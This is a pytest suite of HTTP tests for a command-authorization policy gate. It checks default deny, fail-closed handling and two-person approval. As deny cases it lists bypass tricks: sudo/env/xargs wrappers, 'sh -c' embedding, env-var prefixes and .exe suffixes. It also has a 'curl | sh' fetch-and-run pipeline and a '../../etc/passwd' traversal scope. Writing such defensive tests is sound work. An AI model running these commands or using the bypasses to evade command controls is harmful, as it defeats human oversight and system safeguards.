"""HTTP-level integration tests for `saena_policy_gate.app` routes."""

from __future__ import annotations

from typing import Any

import pytest
from fastapi.testclient import TestClient
from policy_gate_factories import make_authorize_body, make_plan_check_body
from saena_domain.persistence.memory import InMemoryDecisionRecordStore
from saena_domain.persistence.ports import DecisionRecordPort
from saena_policy_gate.app import create_app, get_decision_store, get_engine
from saena_policy_gate.engine import AuthorizationRequest


class _BrokenEngine:
    """HTTP-level fail-closed double — W2A exit "policy-gate fail-closed
    데모: gate 다운 시 승인 불가"."""

    def evaluate(self, request: AuthorizationRequest) -> Any:
        raise RuntimeError("policy engine unreachable")


def test_health_ok_no_tenant_header_required(client: TestClient) -> None:
    response = client.get("/v1/health")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_module_level_singletons_are_wired() -> None:
    """`get_decision_store`/`get_engine` (the DEFAULT dependency providers,
    overridden per-test by the `client` fixture) resolve to the
    module-level singleton instances — proven directly rather than only
    through `TestClient`, since every route test overrides them."""
    from saena_policy_gate.app import _decision_store, _engine, get_decision_store, get_engine

    assert get_decision_store() is _decision_store
    assert get_engine() is _engine


def test_missing_tenant_header_rejected(client: TestClient) -> None:
    response = client.post("/v1/gate/authorize", json=make_authorize_body())
    assert response.status_code == 403
    body = response.json()
    assert body["error_code"] == "saena.auth.tenant_mismatch"
    assert body["type"].startswith("https://schemas.the-saena.ai/errors/")


def test_authorize_default_deny(client: TestClient, tenant_headers: dict[str, str]) -> None:
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=["ls"]),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "deny"
    assert body["require_two_person"] is False


def test_authorize_allow(client: TestClient, tenant_headers: dict[str, str]) -> None:
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=["pytest", "-x"]),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "allow"


@pytest.mark.parametrize(
    "resource",
    [
        ["kubectl", "patch", "pod", "x"],
        ["kubectl", "edit", "deployment", "x"],
        ["git", "push"],
        ["git", "-c", "a=b", "push"],
        ["git", "-C", "some/dir", "push"],
        ["/usr/bin/kubectl", "patch", "pod", "x"],
        ["helm", "upgrade", "release", "chart"],
        # critic MUST-FIX 1: exec-wrapper bypass
        ["env", "kubectl", "patch", "pod", "x"],
        ["sudo", "kubectl", "patch", "pod", "x"],
        ["xargs", "kubectl", "patch", "pod", "x"],
        ["timeout", "30", "kubectl", "patch", "pod", "x"],
        ["nice", "-n", "5", "kubectl", "delete", "pod", "x"],
        ["chroot", "/x", "kubectl", "patch", "pod", "x"],
        # critic MUST-FIX 2: sh -c "embedded string" bypass
        ["sh", "-c", "kubectl patch pod x"],
        ["bash", "-c", "kubectl patch pod x"],
        ["su", "root", "-c", "kubectl patch pod x"],
        # critic MUST-FIX 3: env-var-assignment-prefix bypass
        ["GIT_SSH=x", "git", "push"],
        ["FOO=bar", "kubectl", "patch", "pod", "x"],
        # critic MUST-FIX 4: .exe suffix bypass
        ["kubectl.exe", "patch", "pod", "x"],
        ["KUBECTL.EXE", "patch", "pod", "x"],
    ],
)
def test_authorize_denies_bypass_regressions(
    client: TestClient, tenant_headers: dict[str, str], resource: list[str]
) -> None:
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=resource),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "deny"


def test_authorize_git_commit_with_push_in_message_still_allowed(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    """False-positive regression: `git commit -m "fix push bug"` must stay
    ALLOWED — the -m VALUE containing the word "push" is not a subcommand."""
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=["git", "commit", "-m", "fix push bug"]),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "allow"


def test_authorize_denies_curl_pipe_sh_pipeline(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(
            resource=[], pipeline=[["curl", "https://example.com/install.sh"], ["sh"]]
        ),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "deny"


def test_authorize_tab_separated_whitespace_trick_still_denied(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    # Body already carries an argv list (JSON array) — the tab-trick is
    # exercised directly against the engine's split_command_string helper
    # in test_engine.py; here we prove the ROUTE denies the equivalent argv.
    response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=["kubectl", "patch", "pod", "x"]),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["decision"] == "deny"


def test_authorize_decision_is_idempotent_across_requests(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    body = make_authorize_body(resource=["pytest"])
    first = client.post("/v1/gate/authorize", json=body, headers=tenant_headers)
    second = client.post("/v1/gate/authorize", json=body, headers=tenant_headers)
    assert first.status_code == second.status_code == 200
    assert first.json()["decision_key"] == second.json()["decision_key"]
    assert first.json()["decision"] == second.json()["decision"]


def test_plan_check_missing_evidence_denies(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    response = client.post(
        "/v1/gate/plan-check",
        json=make_plan_check_body(evidence_ledger_hash="   "),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "deny"
    assert any("evidence_ledger_hash" in r for r in body["reasons"])


def test_plan_check_allows_valid_plan(client: TestClient, tenant_headers: dict[str, str]) -> None:
    response = client.post(
        "/v1/gate/plan-check", json=make_plan_check_body(), headers=tenant_headers
    )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "allow"
    assert body["require_two_person"] is False


def test_plan_check_high_risk_requires_two_person(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    response = client.post(
        "/v1/gate/plan-check",
        json=make_plan_check_body(hypothesis_risks=["high"]),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    assert response.json()["require_two_person"] is True


def test_plan_check_diff_budget_exceeded_denies(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    response = client.post(
        "/v1/gate/plan-check",
        json=make_plan_check_body(
            diff_max_files=1, diff_stats={"files_changed": 3, "lines_changed": 10}
        ),
        headers=tenant_headers,
    )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "deny"
    assert any("max_files" in r for r in body["reasons"])


def test_plan_check_conflicting_decision_is_409(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    good = make_plan_check_body()
    first = client.post("/v1/gate/plan-check", json=good, headers=tenant_headers)
    assert first.status_code == 200

    # Schema-valid body (so the request itself is not rejected at 422), but
    # with an escaping scope glob so H-3 evaluation denies this time —
    # same decision_key (contract_hash + approver), conflicting decision
    # value against the first, already-recorded "approved" outcome.
    conflicting: dict[str, Any] = make_plan_check_body(
        contract_hash=good["contract_hash"],
        approver_actor_id=good["approver_actor_id"],
        approved_scope=["../../etc/passwd"],
    )
    second = client.post("/v1/gate/plan-check", json=conflicting, headers=tenant_headers)
    assert second.status_code == 409
    body = second.json()
    assert body["error_code"] == "saena.conflict.decision_conflict"
    assert body["type"].startswith("https://schemas.the-saena.ai/errors/")


def test_invalid_request_body_is_422(client: TestClient, tenant_headers: dict[str, str]) -> None:
    response = client.post(
        "/v1/gate/authorize",
        json={"kind": "not-a-kind", "action": "x", "approver_actor_id": "alice"},
        headers=tenant_headers,
    )
    assert response.status_code == 422


def test_fail_closed_http_demo_gate_down_denies_approval(
    tenant_headers: dict[str, str],
) -> None:
    """W2A exit "policy-gate fail-closed 데모: gate 다운 시 승인 불가", proven
    at the HTTP boundary: a broken policy engine wired into the app must
    still return HTTP 200 with `decision: deny` (never an unhandled 500 a
    caller could mistake for "try again"), and `/v1/health` must remain
    reachable independent of the tenant header / engine state so a client
    can distinguish "gate process is up but denying" from "gate process is
    unreachable" (task instruction 4)."""
    broken_store: DecisionRecordPort = InMemoryDecisionRecordStore()
    app = create_app()
    app.dependency_overrides[get_engine] = lambda: _BrokenEngine()
    app.dependency_overrides[get_decision_store] = lambda: broken_store
    with TestClient(app) as client:
        health = client.get("/v1/health")
        assert health.status_code == 200

        response = client.post(
            "/v1/gate/authorize",
            json=make_authorize_body(resource=["pytest"]),
            headers=tenant_headers,
        )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "deny"
    assert body["error_code"] == "saena.policy_denied.gate_unavailable"


class _BrokenRecordStore:
    """HTTP-level double for critic MUST-FIX 5 / ADD-3: recording itself
    fails on an already-computed decision (allow or deny)."""

    def record(self, tenant_id: Any, decision: Any) -> Any:
        raise RuntimeError("decision store unavailable")

    def get(self, tenant_id: Any, decision_key: Any) -> Any:
        raise RuntimeError("decision store unavailable")


def test_fail_closed_http_demo_recording_failure_on_happy_path_allow(
    tenant_headers: dict[str, str],
) -> None:
    """Engine computes ALLOW, but the recording step itself fails — the
    HTTP response must still be 200 deny/gate_unavailable, never a bare
    500, and never an allow with no durable record (critic MUST-FIX 5 /
    ADD-3)."""
    app = create_app()
    app.dependency_overrides[get_decision_store] = lambda: _BrokenRecordStore()
    with TestClient(app) as client:
        response = client.post(
            "/v1/gate/authorize",
            json=make_authorize_body(resource=["pytest"]),
            headers=tenant_headers,
        )
    assert response.status_code == 200
    body = response.json()
    assert body["decision"] == "deny"
    assert body["error_code"] == "saena.policy_denied.gate_unavailable"


def test_authorize_pipeline_requests_get_distinct_decision_keys(
    client: TestClient, tenant_headers: dict[str, str]
) -> None:
    """ADD-2: `curl|sh` (deny) and a distinct benign pipeline from the same
    approver must not collide on the same decision_key."""
    deny_response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(
            resource=[], pipeline=[["curl", "https://example.com/install.sh"], ["sh"]]
        ),
        headers=tenant_headers,
    )
    other_response = client.post(
        "/v1/gate/authorize",
        json=make_authorize_body(resource=[], pipeline=[["echo", "hi"], ["cat"]]),
        headers=tenant_headers,
    )
    assert deny_response.status_code == 200
    assert other_response.status_code == 200
    assert deny_response.json()["decision_key"] != other_response.json()["decision_key"]
    assert deny_response.json()["decision"] == "deny"
